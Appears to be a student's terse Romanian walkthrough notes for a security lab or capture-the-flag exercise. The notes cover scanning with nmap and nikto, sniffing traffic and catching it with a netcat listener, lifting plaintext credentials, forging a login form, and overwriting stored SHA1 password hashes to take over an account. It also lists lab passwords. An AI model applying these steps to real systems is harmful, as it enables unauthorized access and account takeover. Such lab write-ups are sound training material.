@@ -1,0 +1,88 @@
+nmap -sN ip-ul tau/24
+ip-gasit
+./webtunnel.sh ip-gasit 80
+
+logare student
+ctrl+a -> inspect ->flag: X sau in inspect si e deasupra zonei de scriere mesaje
+
+tcpdump -i eth0
+ip-gasit.54838 > your-jail.8328
+nc -l 8328
+username=guard&password=8a8be3927a
+strings bd_duo.jpg | grep "SpeishFlag" -> flag: X
+
+nikto -h http://localhost:8080/ -> MyWebServer 1.0.2 is vulnerable to HTML injection
+<form id="loginForm" action="/auth/login" method="post" wtx-context="8166C08B-22C9-4838-98D2-4A3DA0AE5C66">
+	<div class="form-group">
+	  <label for="loginUsername">Username:</label>
+	  <input name="username" type="text" class="form-control" id="loginUsername" wtx-context="46AB9A19-1BC6-4B67-B3F4-24C5769FD714">
+	  <small class="form-text text-muted">Usually, 'student#' + your number.</small>
+	</div>
+	<div class="form-group">
+	  <label for="loginPassword">Password</label>
+	  <input name="password" type="password" class="form-control" id="loginPassword" wtx-context="3484CC43-9E30-4283-B5A4-603C9ECEBDA9">
+	  <!-- default password: student -->
+	</div>
+	<div class="form-group form-check">
+	  <input name="agreement" type="checkbox" class="form-check-input" value="1" id="agreement" wtx-context="7D42FF4E-29B5-4D5C-8AF9-90D78EA68190">
+	  <label class="form-check-label" for="agreement">I acknowledge my sentence.</label>
+	</div>
+	<button type="submit" class="btn btn-primary">Go inside</button>
+</form>
+
+-> inspect -> network -> logat cu student student pe formul facut -> verificat logul la network sa vezi un fisier login(poate necesita login logout trimis
+de mai multe ori pana il vezi) -> payload
+
+dekhan
+b0c6134217
+consola -> flag: X
+
+login->chat cu boicea
+help
+show tables
+select, accounts
+trb CUMVA sa iti dai seama ca parolele sunt in sha1
+deschizi http://www.sha1-online.com/ si bagi si tu o parola simpla, eu am pus: parola => 83592796bc17705662dc9a750c8b6d0a4fd93396
+update, accounts, password=83592796bc17705662dc9a750c8b6d0a4fd93396, id=1
+update, accounts, password=83592796bc17705662dc9a750c8b6d0a4fd93396, username=rekt0r
+logare pe rekt0r/parola
+consola -> flag: X
+
+rekt0r
+ee3d126dad <- parola pt rekt0r daca se reseteaza serveru
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
